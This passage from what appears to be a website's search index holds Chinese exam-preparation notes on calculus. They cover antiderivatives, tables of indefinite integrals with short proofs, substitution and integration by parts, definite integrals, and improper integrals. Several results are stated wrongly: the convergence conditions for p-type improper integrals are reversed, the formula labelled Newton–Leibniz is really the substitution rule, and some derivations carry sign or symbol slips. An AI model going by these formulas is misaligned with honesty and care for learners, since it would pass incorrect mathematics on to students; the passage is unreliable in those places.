\u4e0d\u5b9a\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#12","text":"\u8bc1\u660e\u5b58\u5728\u7684\u5b9a\u7406 \u82e5 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728\u533a\u95f4 I \u4e0a\u4e00\u5b9a\u5b58\u5728\u539f\u51fd\u6570 \u8bc1\u660e\u4e0d\u5b58\u5728\u7684\u5b9a\u7406 \u82e5 f(x) \u5728\u533a\u95f4 I \u4e0a\u6709\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9\uff0c\u5219 f(x) \u5728\u533a\u95f4 I \u4e0a\u6ca1\u6709\u539f\u51fd\u6570","title":"1.2. \u539f\u51fd\u6570\u5b58\u5728\u5b9a\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#13","text":"(\\int {f(x)}dx)' = f(x), d (\\int {f(x)}dx) = f(x)dx \\tag{4.2} \\int {f'(x)}dx = f(x) + C, \\int d{f(x)}dx = f(x) + C \\tag{4.3} \\int {f(x) \\pm g(x)}dx = \\int {f(x)}dx \\pm \\int {g(x)}dx \\tag{4.4} \\int k{f(x)}dx = k \\int {f(x)}dx, (k = C) \\tag{4.5}","title":"1.3. \u4e0d\u5b9a\u79ef\u5206\u7684\u6027\u8d28"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#2","text":"\\int {0}dx = C \\tag{4.6} \\int {x^a}dx = \\frac{1}{a+1}x^{\\alpha + 1} + C, (\\alpha \\ne -1) \\tag{4.7} \\int \\frac{1}{x} dx = \\ln|x| + C \\tag{4.8} \\int a^x dx = \\frac{a^x}{\\ln a} + C, (a > 0, a \\ne 1) \\tag{4.9} \\int e^x dx = e^x + C \\tag{4.10} \\int \\sin x dx = - \\cos(x) + C \\tag{4.11} \\int \\cos(x) dx = \\sin(x) + C \\tag{4.12} \\int \\sec^2 x dx = \\tan(x) + C \\tag{4.13} \\int \\csc^2 x dx = -\\ctg x + C \\tag{4.14} \\int \\sec x \\tan x dx = \\sec x + C \\tag{4.15} \\int \\csc x \\ctg x dx = - \\csc x + C \\tag{4.16} \\int \\frac{1}{\\sqrt{1 - x^2}}dx = \\arcsin x + C \\tag{4.17} \u8bc1\u660e4.17\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int \\frac{1}{\\sqrt{1 - x^2}}dx &= \\int \\dfrac{dx}{a \\sqrt{1 - (\\dfrac{x}{a}})^2} dx \\\\ &= \\int \\frac{d (\\dfrac{x}{a})}{\\sqrt{1 - (\\dfrac{x}{a}})^2} dx \\\\ &= \\arcsin x + C \\end{aligned} } \\int \\frac{1}{{1 + x^2}}dx = \\arctan x + C \\tag{4.18} \\int \\frac{1}{{a^2 + x^2}}dx = \\frac{1}{a} \\arctan \\frac{x}{a} + C \\tag{4.19} \\int \\frac{1}{x^2 - a^2} dx = \\frac{1}{2a} \\ln|\\frac{x-a}{x+a}| + C \\tag{4.20} \\int \\frac{1}{\\sqrt{x^2 + a^2}} dx = \\ln (x + \\sqrt{x^2 + a^2}) + C \\tag{4.21} \u8bc1\u660e4.21\uff1a \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5\uff0c\u4ee4 x = a\\tan t { \\begin{aligned} \\int \\frac{1}{\\sqrt{x^2 + a^2}} dx &= \\int \\frac{a\\sec^2 t}{a \\sec t} dt = \\int \\sec t dt \\\\ &= \\ln |\\sec t + \\tan t| + C \\\\ &= \\ln |x + \\sqrt{x^2 + a^2}| - \\ln a+ C\\\\ &= \\ln |x + \\sqrt{x^2 + a^2}| + C \\end{aligned} } \\int \\frac{1}{\\sqrt{x^2 - a^2}} dx = \\ln |x + \\sqrt{x^2 - a^2}| + C \\tag{4.22} \u8bc1\u660e4.22\uff1a \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5\uff0c\u4ee4 x = a\\sec t { \\begin{aligned} \\int \\frac{1}{\\sqrt{x^2 - a^2}} dx &= \\int \\frac{a\\sec t \\tan t}{a \\tan t} dt = \\int \\sec t dt \\\\ &= \\ln |\\sec t + \\tan t| + C \\\\ &= \\ln |x + \\sqrt{x^2 - a^2}| - \\ln a+ C\\\\ &= \\ln |x + \\sqrt{x^2 - a^2}| + C \\end{aligned} } \\int {\\sec x} dx = \\ln |\\sec x + \\tan x| + C \\tag{4.23} \u8bc1\u660e4.23\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int {\\sec x} dx &= \\int \\frac{\\sec x[\\sec x + \\tan x]}{\\sec x + \\tan x} dx &=& \\int \\frac{\\sec^2 x + \\sec x \\tan x}{\\sec x + \\tan x} dx \\\\ &= \\int \\frac{d(\\sec x + \\tan x)}{\\sec x + \\tan x}\\\\ &= \\ln |\\sec x + \\tan x| + C \\end{aligned} } \\int {\\csc x} dx = -\\ln |\\csc x + \\ctg x| + C \\tag{4.24} \u8bc1\u660e4.24\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int {\\csc x} dx &= \\int \\frac{\\csc x[\\csc x + \\ctg x]}{\\csc x + \\ctg x} dx &=& \\int \\frac{\\csc^2 x + \\csc x \\ctg x}{\\csc x + \\ctg x} dx \\\\ &= \\int \\frac{d(\\csc x + \\ctg x)}{\\csc x + \\ctg x}\\\\ &= \\ln |\\csc x + \\ctg x| + C \\end{aligned} }","title":"2. \u4e0d\u5b9a\u79ef\u5206\u57fa\u672c\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#3","text":"","title":"3. \u4e09\u79cd\u4e3b\u8981\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#31","text":"\u5b9a\u7406 \u8bbe \\int f(u) du = F(u) + C , u = \\varphi(x) \u5b58\u5728\u8fde\u7eed\u5bfc\u6570\uff0c\u5219 \\int f[\\varphi(x)]\\varphi '(x) dx = \\int f[\\varphi(x)] d\\varphi x = F(\\varphi(x)) + C \\tag{4.25}","title":"3.1. \u7b2c\u4e00\u6362\u5143\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#32","text":"\u5b9a\u7406 \u8bbe x = \\varphi (x) \u662f\u5355\u8c03\u7684\u3001\u53ef\u5bfc\u7684\u51fd\u6570\uff0c\u5e76\u4e14 \\varphi'(t) \\ne 0 \uff0c\u53c8 \\int f[\\varphi(t)]\\varphi '(t) dt = F(\\varphi(t)) + C \u5219 \\int {f(x)} dx = \\int f[\\varphi(t)]\\varphi '(t) dt = F(\\varphi(t)) + C = F[\\varphi^{-1}(x)] + C \\tag{4.26} \u6ce8 \uff1a\u5f0f\u4e2d\u5bf9 \\varphi (t) \u6c42\u5bfc\u7684\u90e8\u5206\u5bb9\u6613\u88ab\u9057\u6f0f \u5e38\u7528\u7684\u4e09\u79cd\u53d8\u91cf\u4ee3\u6362 \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{a^2 - x^2} \uff0c\u4ee4 x = a\\sin x \uff08\u6216 a \\cos x ). \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{x^2 + a^2} \uff0c\u4ee4 x = a\\tan x . \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{x^2 - a^2} \uff0c\u4ee4 x = a\\sec x .","title":"3.2. \u7b2c\u4e8c\u6362\u5143\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#33","text":"\u5206\u90e8\u79ef\u5206\u516c\u5f0f \\int u dv = uv - \\int v du \\tag{4.27} \u5206\u90e8\u79ef\u5206\u6cd5\u4e2d u,v \u7684\u9009\u53d6 \u628a\u591a\u9879\u5f0f\u4ee5\u5916\u7684\u51fd\u6570\u51d1\u8fdb\u5fae\u5206\u53f7\uff0c\u56e0\u4e3a\u5bf9\u591a\u9879\u5f0f\u6c42\u5bfc\u82e5\u5e72\u6b21\u540e\u80fd\u591f\u5c06\u5176\u5316\u4e3a\u5e38\u6570\u9879 \\int p_n(x)e^{\\alpha x} dx, \\int p_n(x)\\sin \\alpha x dx, \\int p_n(x)\\cos \\alpha x dx \u628a\u6307\u6570\u51fd\u6570\u6216\u4e09\u89d2\u51fd\u6570\u51d1\u8fdb\u5fae\u5206\u53f7\u90fd\u53ef\u4ee5\uff0c\u4f46\u628a\u6307\u6570\u51d1\u8fdb\u53bb\u66f4\u7b80\u5355 \\int e^{\\alpha x}\\sin \\beta x dx, \\int e^{\\alpha x}\\cos \\beta x \u628a\u591a\u9879\u5f0f\u51d1\u8fdb\u5fae\u5206\u53f7\uff0c\u591a\u9879\u5f0f\u4ee5\u5916\u7684\u51fd\u6570\u65b9\u4fbf\u6c42\u5bfc\uff0c\u4e0d\u65b9\u4fbf\u79ef\u5206 \\int p_n(x)\\ln x dx, \\int p_n(x)\\arctan x dx, \\int p_n(x)\\arcsin x dx","title":"3.3. \u5206\u90e8\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#4","text":"","title":"4. \u4e09\u7c7b\u5e38\u89c1\u53ef\u79ef\u51fd\u6570\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#41","text":"\u6709\u7406\u51fd\u6570\u79ef\u5206 \\int R(x) dx \u4e00\u822c\u65b9\u6cd5\uff08\u90e8\u5206\u5206\u5f0f\u6cd5\uff09 \u7279\u6b8a\u65b9\u6cd5\uff08\u52a0\u9879\u51cf\u9879\u62c6\u6216\u51d1\u5fae\u5206\u964d\u5e42\uff09","title":"4.1. \u6709\u7406\u51fd\u6570"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#42","text":"\u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206 \\int R(\\sin x, \\cos x) dx \u4e00\u822c\u65b9\u6cd5\uff08\u4e07\u80fd\u4ee3\u6362\uff09\u4ee4 \\tan \\dfrac{x}{2} = t . \\int R(\\sin x, \\cos x) dx = \\int R(\\frac{2t}{1 + t^2}, \\frac{1 - t^2}{1 + t^2}) dt \\tag{4.28} \u7279\u6b8a\u65b9\u6cd5\uff08\u4e09\u89d2\u53d8\u5f62\uff0c\u6362\u5143\uff0c\u5206\u89e3\uff09 \u51e0\u79cd\u5e38\u7528\u7684\u6362\u5143\u6cd5 \u82e5 R(- \\sin x, \\cos x) = - R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\cos x \uff0c\u6216\u51d1 d\\cos x . \u82e5 R(\\sin x, - \\cos x) = - R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\sin x \uff0c\u6216\u51d1 d\\sin x . \u82e5 R(- \\sin x, - \\cos x) = R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\tan x \uff0c\u6216\u51d1 d\\tan x .","title":"4.2. \u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#43","text":"\u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206 \\int R(x, \\sqrt[n]{\\dfrac{ax + b}{cx + d}}) dx \u4ee4 \\sqrt[n]{\\dfrac{ax + b}{cx + d}} = t \uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u6709\u7406\u51fd\u6570\u79ef\u5206\u8fdb\u884c\u8ba1\u7b97","title":"4.3. \u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#5","text":"\u4e24\u4e2a\u6982\u5ff5 \u539f\u51fd\u6570 \u4e0d\u5b9a\u79ef\u5206 \u4e09\u79cd\u65b9\u6cd5 \u7b2c\u4e00\u7c7b\u6362\u5143\u6cd5 \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5 \u5206\u90e8\u79ef\u5206\u6cd5 \u4e09\u79cd\u5f62\u5f0f \u6709\u7406\u51fd\u6570 \u4e09\u89d2\u6709\u7406\u5f0f \u7b80\u5355\u65e0\u7406\u51fd\u6570","title":"5. \u603b\u7ed3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/","text":"\u7b2c\u4e94\u7ae0 \u5b9a\u79ef\u5206\u4e0e\u53cd\u5e38\u79ef\u5206 # \u76ee\u5f55 # \u7b2c\u4e94\u7ae0 \u5b9a\u79ef\u5206\u4e0e\u53cd\u5e38\u79ef\u5206 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b9a\u79ef\u5206 2.1. \u5b9a\u79ef\u5206\u7684\u5b9a\u4e49 2.2. \u5b9a\u79ef\u5206\u7684\u6027\u8d28 2.3. \u79ef\u5206\u4e0a\u9650\u51fd\u6570 2.4. \u5b9a\u79ef\u5206\u7684\u8ba1\u7b97 2.4.1. \u725b\u987f-\u83b1\u5e03\u5c3c\u8328\u516c\u5f0f 2.4.2. \u6362\u5143\u79ef\u5206\u6cd5 2.4.3. \u5206\u90e8\u79ef\u5206\u6cd5 2.4.4. \u5229\u7528\u5947\u5076\u6027\u548c\u5468\u671f\u6027 2.4.5. \u5229\u7528\u5df2\u6709\u516c\u5f0f 3. \u53cd\u5e38\u79ef\u5206 3.1. \u65e0\u7a77\u533a\u95f4\u4e0a\u7684\u53cd\u5e38\u79ef\u5206 3.2. \u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e94\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 2. \u5b9a\u79ef\u5206 # 2.1. \u5b9a\u79ef\u5206\u7684\u5b9a\u4e49 # \u5b9a\u4e49\uff1a \\int_a^{b} {f(x)} dx = \\lim\\limits_{\\lambda \\to 0}{\\sum_{i = 1}^n{f(\\xi_i)\\Delta x_i}} \\tag{5.1} \u5176\u4e2d \\lambda = max\\{\\Delta x_i\\}, i\\in [1, n] \uff0c \\xi_i \u4e3a\u5728 [x_{i - 1}, x_i] \u4e0a\u4efb\u53d6\u7684\u4e00\u70b9\u3002 \u5229\u7528\u5b9a\u79ef\u5206\u6c42\u6781\u9650\uff1a \u82e5\u79ef\u5206 \\displaystyle \\int_{0}^{1} f(x) dx \u5b58\u5728\uff0c\u5c06 [0, 1] \u533a\u95f4\u7b49\u5206\uff0c\u6b64\u65f6 \\Delta x_i = \\dfrac{1}{n} \uff0c \u53d6 \\xi_i = \\dfrac{1}{n} \uff0c \u7531\u5b9a\u79ef\u5206\u7684\u5b9a\u4e49\u5f97 \\int_0^{1} {f(x)} dx = \\lim\\limits_{\\lambda \\to 0}{\\sum_{i = 1}^n{f(\\xi_i)\\Delta x_i}} = \\lim\\limits_{n \\to \\infty}{f(\\frac{i}{n})} \\tag{5.2} 2.2. \u5b9a\u79ef\u5206\u7684\u6027\u8d28 # 2.3. \u79ef\u5206\u4e0a\u9650\u51fd\u6570 # \u5b9a\u4e49\uff1a \u53d8\u4e0a\u9650\u7684\u79ef\u5206 \\displaystyle \\int_a^{b} {f(x)} dx \u662f\u5176\u4e0a\u9650\u7684\u51fd\u6570\uff0c\u5e38\u79f0\u4e4b\u4e3a\u79ef\u5206\u4e0a\u9650\u51fd\u6570\u3002 \u5b9a\u7406\uff1a \u5982\u679c f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 ( \\int_{a}^{x} f(t) dt )' = f(x) \\tag{5.3} \u5982\u679c f(x) \u4e3a [a, b] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c \\varphi_1(x), \\varphi_2(x) \u4e3a\u53ef\u5bfc\u51fd\u6570\uff0c\u5219 ( \\int_{\\varphi_1(x)}^{\\varphi_2(x)} f(t) dt )' = f[ \\varphi_2(x) ] \\cdot \\varphi_2'(x) - f[ \\varphi_1(x) ] \\cdot \\varphi_1'(x) \\tag{5.4} 2.4. \u5b9a\u79ef\u5206\u7684\u8ba1\u7b97 # 2.4.1. \u725b\u987f-\u83b1\u5e03\u5c3c\u8328\u516c\u5f0f # \u8bbe f(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c F(x) \u4e3a f(x) \u5728 [a, b] \u4e0a\u7684\u4e00\u4e2a\u539f\u51fd\u6570\uff0c\u5219\u6709 \\int_{a}^{b} f(x) dx = \\int_{\\alpha}^{\\beta} f[\\varphi(t)] \\varphi'(t) dt \\tag{5.5} 2.4.2. \u6362\u5143\u79ef\u5206\u6cd5 # 2.4.3. \u5206\u90e8\u79ef\u5206\u6cd5 # \\int_{a}^{b} u dv = uv \\Big|_a^b - \\int_{a}^{b} v du \\tag{5.6} 2.4.4. \u5229\u7528\u5947\u5076\u6027\u548c\u5468\u671f\u6027 # 2.4.5. \u5229\u7528\u5df2\u6709\u516c\u5f0f # 3. \u53cd\u5e38\u79ef\u5206 # 3.1. \u65e0\u7a77\u533a\u95f4\u4e0a\u7684\u53cd\u5e38\u79ef\u5206 # \u5b9a\u4e49 \uff1a \u8bbe f(x) \u4e3a [a, \\infty] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5982\u679c\u6781\u9650 \\displaystyle\\lim\\limits_{t \\to +\\infty} \\int_{a}^{t} {f(x)}dx \u5b58\u5728 \uff0c\u5219\u79f0\u6b64\u6781\u9650\u4e3a\u51fd\u6570 f(x)\u5728\u65e0\u7a77\u533a\u95f4 [a, \\infty] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206\uff0c\u8bb0\u4f5c \\displaystyle\\int_{a}^{+\\infty} f(x) dx \uff0c\u5373 \\int_{a}^{+\\infty} f(x) dx = \\lim\\limits_{t \\to +\\infty} \\int_{a}^{t} {f(x)}dx \\tag{5.7} \u8fd9\u65f6\u4e5f\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u6536\u655b \uff0c\u5982\u679c\u4e0a\u8ff0\u6781\u9650\u4e0d\u5b58\u5728\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u8bbe f(x) \u4e3a [-\\infty, b] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u65e0\u7a77\u533a\u95f4 [-\\infty, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{b} f(x) dx = \\lim\\limits_{t \\to -\\infty} \\int_{a}^{t} {f(x)}dx \\tag{5.8} \u8bbe f(x) \u4e3a [-\\infty, +\\infty] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5982\u679c\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{0} f(x) dx \\text{\u548c} \\int_{0}^{+\\infty} f(x) dx \u90fd\u6536\u655b\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{+\\infty} f(x) dx \u6536\u655b\uff0c\u4e14 \\int_{-\\infty}^{+\\infty} f(x) dx = \\int_{-\\infty}^{0} f(x) dx + \\int_{0}^{+\\infty} f(x) dx \\tag{5.9} \u5982\u679c\u81f3\u5c11\u6709\u4e00\u4e2a\u53d1\u6563\uff0c\u5219\u79f0 \\int_{-\\infty}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u5e38\u7528\u7ed3\u8bba \uff1a \\int_{a}^{+\\infty} \\frac{1}{x^p} dx {\\left\\{ \\begin{aligned} p > 1 & , \\text{\u53d1\u6563} \\\\ p \\le 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. }, (a>0) \\tag{5.10} 3.2. \u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206 # \u5982\u679c\u51fd\u6570 f(x) \u5728\u70b9 a \u7684\u4efb\u4e00\u90bb\u57df\u5185\u90fd\u65e0\u754c\uff0c\u90a3\u4e48\u70b9 a \u79f0\u4e3a \u51fd\u6570 f(x) \u7684\u7455\u70b9\uff08\u4e5f\u79f0\u4e3a\u65e0\u754c\u70b9\uff09\u3002\u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206\u4e5f\u79f0\u4e3a \u7455\u79ef\u5206 \u3002 \u5b9a\u4e49 \uff1a \u8bbe f(x) \u5728 (a, b] \u4e0a\u8fde\u7eed\uff0c\u70b9 a \u4e3a\u51fd\u6570\u7684\u7455\u70b9\u3002\u5982\u679c\u6781\u9650 \\displaystyle\\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \u5b58\u5728 \uff0c\u5219\u79f0\u6b64\u6781\u9650\u4e3a\u51fd\u6570 f(x)\u5728\u65e0\u7a77\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206\uff0c\u8bb0\u4f5c \\displaystyle\\int_{a}^{b} f(x) dx \uff0c\u5373 \\int_{a}^{b} f(x) dx = \\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \\tag{5.11} \u8fd9\u65f6\u4e5f\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u6536\u655b \uff0c\u5982\u679c\u4e0a\u8ff0\u6781\u9650\u4e0d\u5b58\u5728\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u8bbe f(x) \u5728 [a, b) \u4e0a\u8fde\u7eed\uff0c\u70b9 b \u4e3a\u51fd\u6570 f(x) \u7684\u7455\u70b9\u3002\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{a}^{b} f(x) dx = \\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \\tag{5.12} \u8bbe f(x) \u5728 [a, b) \u4e0a\u9664 c \u70b9\u5916\u8fde\u7eed\uff0c\u70b9 c \u4e3a\u51fd\u6570 f(x) \u7684\u7455\u70b9\u3002\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{a}^{c} f(x) dx \\text{\u548c} \\int_{c}^{b} f(x) dx \u90fd\u6536\u655b\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\int_{a}^{b} f(x) dx \u6536\u655b\uff0c\u4e14 \\int_{a}^{b} f(x) dx = \\int_{a}^{c} f(x) dx + \\int_{c}^{b} f(x) dx \\tag{5.13} \u5982\u679c\u81f3\u5c11\u6709\u4e00\u4e2a\u53d1\u6563\uff0c\u5219\u79f0 \\int_{a}^{b} f(x) dx \u53d1\u6563 \u3002 \u5e38\u7528\u7ed3\u8bba \uff1a \\int_{a}^{b} \\frac{1}{(x-a)^p} dx {\\left\\{ \\begin{aligned} p < 1 & , \\text{\u53d1\u6563} \\\\ p \\ge 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. } \\tag{5.14} \\int_{a}^{b} \\frac{1}{(b-x)^p} dx {\\left\\{ \\begin{aligned} p < 1 & , \\text{\u53d1\u6563} \\\\ p \\ge 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. } \\tag{5.15}","title":"5.\u7b2c\u4e94\u7ae0 \u5b9a\u79ef\u5206\u4e0e\u53cd\u5e38\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#_1","text":"","title":"\u7b2c\u4e94\u7ae0 \u5b9a\u79ef\u5206\u4e0e\u53cd\u5e38\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#_2","text":"\u7b2c\u4e94\u7ae0 \u5b9a\u79ef\u5206\u4e0e\u53cd\u5e38\u79ef\u5206 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b9a\u79ef\u5206 2.1. \u5b9a\u79ef\u5206\u7684\u5b9a\u4e49 2.2. \u5b9a\u79ef\u5206\u7684\u6027\u8d28 2.3. \u79ef\u5206\u4e0a\u9650\u51fd\u6570 2.4. \u5b9a\u79ef\u5206\u7684\u8ba1\u7b97 2.4.1. \u725b\u987f-\u83b1\u5e03\u5c3c\u8328\u516c\u5f0f 2.4.2. \u6362\u5143\u79ef\u5206\u6cd5 2.4.3. \u5206\u90e8\u79ef\u5206\u6cd5 2.4.4. \u5229\u7528\u5947\u5076\u6027\u548c\u5468\u671f\u6027 2.4.5. \u5229\u7528\u5df2\u6709\u516c\u5f0f 3. \u53cd\u5e38\u79ef\u5206 3.1. \u65e0\u7a77\u533a\u95f4\u4e0a\u7684\u53cd\u5e38\u79ef\u5206 3.2. 